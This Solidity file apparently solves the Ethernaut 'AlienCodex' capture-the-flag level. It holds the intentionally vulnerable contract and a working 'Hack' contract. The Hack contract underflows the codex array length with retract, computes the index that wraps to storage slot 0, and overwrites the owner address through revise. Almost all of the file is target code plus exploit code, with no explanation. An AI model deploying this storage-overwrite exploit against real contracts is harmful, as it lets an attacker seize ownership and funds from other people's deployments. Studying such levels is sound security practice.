// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(isOwner());
        _;
    }

    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function getCodexLength() contacted public view returns (uint256) {
    return codex.length;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }

  function generateRandomBytes32(uint256 value) public pure returns (bytes32) {
      return keccak256(abi.encodePacked(value));
  }
}

contract Hack {
  AlienCodex ac;

  constructor(address acAddress) public {
    ac = AlienCodex(acAddress);
  }

  function hack() public {
    uint256 index;
    ac.make_contact();
    ac.retract();
    index = computeIndex();
    ac.revise(index, bytes32(uint(msg.sender)));
  }

  function computeIndex() internal pure returns (uint256) {
    bytes32 codexArrayKeccak = keccak256(abi.encodePacked(uint256(1)));
    return (0 - uint256(codexArrayKeccak));
  }
}